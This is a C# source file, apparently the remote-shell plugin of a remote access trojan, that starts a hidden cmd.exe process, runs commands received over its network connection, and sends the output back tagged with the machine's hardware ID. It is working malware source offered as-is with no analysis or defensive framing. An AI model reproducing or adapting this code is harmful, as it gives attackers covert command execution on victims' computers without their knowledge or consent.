using Plugin;
using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading;

namespace Miscellaneous.Handler
{
    public static class HandleShell
    {
        public static Process ProcessShell;
        public static string Input { get; set; }
        public static bool CanWrite { get; set; }

        public static void ShellWriteLine(string arg)
        {
            Input = arg;
            CanWrite = true;
        }

        public static void StarShell()
        {
            ProcessShell = new Process()
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))
                }
            };
            ProcessShell.OutputDataReceived += ShellDataHandler;
            ProcessShell.ErrorDataReceived += ShellDataHandler;
            ProcessShell.Start();
            ProcessShell.BeginOutputReadLine();
            ProcessShell.BeginErrorReadLine();
            while (Connection.IsConnected)
            {
                Thread.Sleep(1);
                if (CanWrite)
                {
                    if (Input == "exit".ToLower())
                    {
                        break;
                    }
                    ProcessShell.StandardInput.WriteLine(Input);
                    CanWrite = false;
                }
            }

            ShellClose();
            return;
        }

        private static void ShellDataHandler(object sender, DataReceivedEventArgs e)
        {
            StringBuilder Output = new StringBuilder();
            try
            {
                Output.AppendLine(e.Data);
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "shell";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("ReadInput").AsString = Output.ToString();
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch { }
        }

        public static void ShellClose()
        {
            try
            {
                if (ProcessShell != null)
                {
                    KillProcessAndChildren(ProcessShell.Id);
                    ProcessShell.OutputDataReceived -= ShellDataHandler;
                    ProcessShell.ErrorDataReceived -= ShellDataHandler;
                    CanWrite = false;
                }
            }
            catch { }
            Connection.Disconnected();
        }

        private static void KillProcessAndChildren(int pid)
        {
            if (pid == 0)
            {
                return;
            }
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                    ("Select * From Win32_Process Where ParentProcessID=" + pid);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            }
            try
            {
                Process proc = Process.GetProcessById(pid);
                proc.Kill();
            }
            catch { }
        }
    }

}
